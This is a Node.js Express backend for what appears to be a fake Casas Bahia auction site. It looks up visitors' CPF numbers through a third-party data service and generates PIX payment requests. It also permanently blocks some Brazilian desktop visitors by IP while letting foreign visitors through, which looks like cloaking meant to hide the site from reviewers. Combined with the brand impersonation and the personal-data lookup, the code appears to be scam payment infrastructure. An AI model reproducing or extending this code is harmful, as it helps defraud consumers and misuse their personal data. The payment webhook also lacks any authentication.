'use strict';

const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

app.set('trust proxy', 1); // IPs reais no Heroku

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── IP Blocker (PostgreSQL permanente) ──────────────────────────────────────

const { Pool } = require('pg');
const pgPool = new Pool({ connectionString: process.env.DATABASE_URL });

// Garante que a tabela existe ao iniciar
pgPool.query(`
  CREATE TABLE IF NOT EXISTS blocked_ips (
    ip TEXT PRIMARY KEY,
    blocked_at TIMESTAMPTZ DEFAULT NOW()
  )
`).catch(() => {});

const geoip = require('geoip-lite');

function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return String(forwarded).split(',')[0].trim();
  return req.socket?.remoteAddress || req.ip || '';
}

function getCountry(ip) {
  try {
    return geoip.lookup(ip)?.country || '';
  } catch {
    return '';
  }
}

function isBrIp(ip) {
  return getCountry(ip) === 'BR';
}

// Cache em memória para evitar query ao Postgres a cada page load
// blocked=true: permanente | blocked=false: expira em 5 min
const blockCache = new Map(); // ip -> { blocked, allowDesktop, expiresAt }
const CACHE_TTL_MS = 5 * 60 * 1000; // 5 minutos para "não bloqueado"

app.get('/api/block/check', async (req, res) => {
  const ip = getClientIp(req);

  // Somente IPs brasileiros têm bloqueio de desktop.
  // Qualquer outro país (EUA, Índia, etc.) acessa normalmente.
  if (!isBrIp(ip)) {
    return res.json({ blocked: false, allowDesktop: true, ip });
  }

  // Verifica cache
  const cached = blockCache.get(ip);
  if (cached && (cached.blocked || Date.now() < cached.expiresAt)) {
    return res.json({ blocked: cached.blocked, allowDesktop: false, ip });
  }

  try {
    const result = await pgPool.query(
      'SELECT 1 FROM blocked_ips WHERE ip = $1 LIMIT 1',
      [ip]
    );
    const blocked = result.rowCount > 0;
    blockCache.set(ip, {
      blocked,
      expiresAt: blocked ? Infinity : Date.now() + CACHE_TTL_MS,
    });
    res.json({ blocked, allowDesktop: false, ip });
  } catch {
    res.json({ blocked: false, allowDesktop: false, ip });
  }
});

app.post('/api/block/register', async (req, res) => {
  const ip = getClientIp(req);
  try {
    await pgPool.query(
      'INSERT INTO blocked_ips (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING',
      [ip]
    );
    // Atualiza cache imediatamente
    blockCache.set(ip, { blocked: true, expiresAt: Infinity });
    res.json({ ok: true, ip });
  } catch {
    res.json({ ok: false, ip });
  }
});

// ─── Health ───────────────────────────────────────────────────────────────────

app.get('/api/healthz', (_req, res) => {
  res.json({ status: 'ok' });
});

// ─── CPF consulta ─────────────────────────────────────────────────────────────

app.get('/api/cpf/consulta', async (req, res) => {
  const cpf = String(req.query.cpf || '').replace(/\D/g, '');
  if (cpf.length !== 11) {
    return res.status(400).json({ error: 'CPF inválido' });
  }
  try {
    const response = await axios.get(
      `https://renouvaslab.beauty/api/consulta.php?cpf=${cpf}`,
      { timeout: 10000 }
    );
    return res.json(response.data);
  } catch (err) {
    return res.status(502).json({ error: 'Erro ao consultar CPF' });
  }
});

// ─── TheKey helpers ───────────────────────────────────────────────────────────

const THEKEY_BASE = 'https://api.the-key.club/api';
const THEKEY_WEBHOOK_URL = 'https://leilaocasasbahia.comprarprodutos-shop.com/api/webhook/thekey';

let thekeyToken = null;
let thekeyTokenExpiry = 0;

async function getThekeyToken() {
  if (thekeyToken && Date.now() < thekeyTokenExpiry) return thekeyToken;
  const clientId = process.env.THEKEY_CLIENT_ID;
  const clientSecret = process.env.THEKEY_CLIENT_SECRET;
  if (!clientId || !clientSecret) throw new Error('THEKEY_CLIENT_ID / THEKEY_CLIENT_SECRET ausentes');
  const res = await axios.post(
    `${THEKEY_BASE}/auth/login`,
    { client_id: clientId, client_secret: clientSecret },
    { timeout: 10000 }
  );
  thekeyToken = res.data.token;
  thekeyTokenExpiry = Date.now() + 55 * 60 * 1000; // renova 5 min antes do 1h
  return thekeyToken;
}

// ── In-memory paid map (webhook → SSE) ───────────────────────────────────────
// Quando o webhook da TheKey chegar com status COMPLETED, marcamos o txId aqui.
// O SSE stream verifica esse map a cada 2s em vez de fazer polling externo.

const paidTxIds = new Map(); // txId -> timestamp

function markPaid(txId) {
  paidTxIds.set(txId, Date.now());
}

function isPaidInMemory(txId) {
  return paidTxIds.has(txId);
}

// Limpa entradas com mais de 30 minutos para não vazar memória
setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  paidTxIds.forEach((ts, id) => { if (ts < cutoff) paidTxIds.delete(id); });
}, 30 * 60 * 1000);

// ─── PIX create ───────────────────────────────────────────────────────────────

app.post('/api/pix/create', async (req, res) => {
  try {
    const { name, email, cpf, phone, amount } = req.body;

    if (!name || !cpf || !amount) {
      return res.status(400).json({ error: 'name, cpf e amount são obrigatórios' });
    }

    const token = await getThekeyToken();
    const cleanCpf = cpf.replace(/\D/g, '');
    const cleanPhone = (phone || '11999999999').replace(/\D/g, '');
    const amountNum = Number(amount);
    const externalId = `leilao_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

    const payload = {
      amount: amountNum,
      external_id: externalId,
      clientCallbackUrl: THEKEY_WEBHOOK_URL,
      payer: {
        name,
        email: email || `${cleanCpf}@arrematante.com.br`,
        document: cleanCpf,
        phone: cleanPhone,
      },
    };

    const response = await axios.post(`${THEKEY_BASE}/payments/deposit`, payload, {
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
      timeout: 15000,
    });

    const qrData = response.data.qrCodeResponse || response.data;
    const txId = qrData.transactionId;

    console.log(`[THEKEY] PIX criado — id: ${txId}`);
    return res.json({
      id: txId,
      status: 'pending',
      pixCode: qrData.qrcode || null,
      expirationDate: null,
    });
  } catch (err) {
    const errData = err.response && err.response.data;
    const msg =
      (errData && errData.message) ||
      (errData && errData.error) ||
      err.message ||
      'Erro ao criar transação';
    console.error(`[THEKEY] Erro ao criar PIX: ${msg}`);
    if (errData) console.error('[THEKEY] Resposta:', JSON.stringify(errData));
    return res.status(500).json({ error: msg });
  }
});

// ─── PIX status (verifica mapa local preenchido pelo webhook) ─────────────────

app.get('/api/pix/status/:id', (req, res) => {
  const txId = req.params.id;
  if (isPaidInMemory(txId)) {
    return res.json({ id: txId, status: 'paid', paidAt: new Date().toISOString() });
  }
  return res.json({ id: txId, status: 'pending', paidAt: null });
});

// ─── Webhook — TheKey → nosso servidor ───────────────────────────────────────

app.post('/api/webhook/thekey', (req, res) => {
  try {
    const { transaction_id, status, amount } = req.body;
    if (status === 'COMPLETED' && transaction_id) {
      console.log(`[THEKEY WEBHOOK] Pagamento confirmado: ${transaction_id} — R$ ${amount}`);
      markPaid(transaction_id);
    } else {
      console.log(`[THEKEY WEBHOOK] Evento: status=${status} id=${transaction_id}`);
    }
  } catch (err) {
    console.error('[THEKEY WEBHOOK] Erro ao processar:', err);
  }
  // Sempre retorna 200 para a TheKey não reenviar
  res.json({ received: true });
});

// ─── PIX stream — SSE confirmação em tempo real via webhook ──────────────────

app.get('/api/pix/stream/:id', (req, res) => {
  const txId = req.params.id;

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  let closed = false;
  let pollTimer = null;
  let heartbeatTimer = null;

  function cleanup() {
    closed = true;
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
  }

  function send(data) {
    if (!closed) res.write('data: ' + JSON.stringify(data) + '\n\n');
  }

  // Heartbeat a cada 20s — evita que Heroku/proxies matem a conexão ociosa
  heartbeatTimer = setInterval(() => {
    if (!closed) res.write(': heartbeat\n\n');
  }, 20000);

  // Verifica o mapa in-memory a cada 2s (populado pelo webhook da TheKey)
  pollTimer = setInterval(() => {
    if (closed) return;
    if (isPaidInMemory(txId)) {
      send({ type: 'payment_approved', status: 'paid' });
      cleanup();
      res.end();
    }
  }, 2000);

  // Auto-fecha após 10 minutos para evitar conexões zumbi
  const timeout = setTimeout(() => {
    if (!closed) {
      send({ type: 'timeout' });
      cleanup();
      res.end();
    }
  }, 10 * 60 * 1000);

  req.on('close', () => {
    clearTimeout(timeout);
    cleanup();
  });
});

// ─── Static frontend (built by Vite) ─────────────────────────────────────────

const STATIC_DIR = path.join(__dirname, 'artifacts', 'leilao-cb', 'dist', 'public');

app.use(express.static(STATIC_DIR));

app.get('*', (_req, res) => {
  res.sendFile(path.join(STATIC_DIR, 'index.html'));
});

// ─── Start ────────────────────────────────────────────────────────────────────

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully...');
  process.exit(0);
});
